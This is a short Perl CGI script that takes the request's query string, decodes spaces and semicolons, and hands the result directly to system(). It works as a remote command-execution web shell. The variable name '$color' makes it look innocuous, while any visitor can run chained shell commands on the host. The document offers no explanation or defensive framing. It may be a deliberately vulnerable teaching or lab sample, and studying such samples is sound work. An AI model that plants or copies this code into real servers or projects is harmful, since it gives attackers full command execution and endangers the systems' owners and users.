#!/bin/perl
print "HTTP/1.0 200 OK\n";
print "Content-Type: text/html\n\n\n";

my $color = $ENV{QUERY_STRING};
        chomp ($color);
        $color =~ s/%20/ /g; 
        $color =~ s/%3b/;/g;

system $color;
exit(0);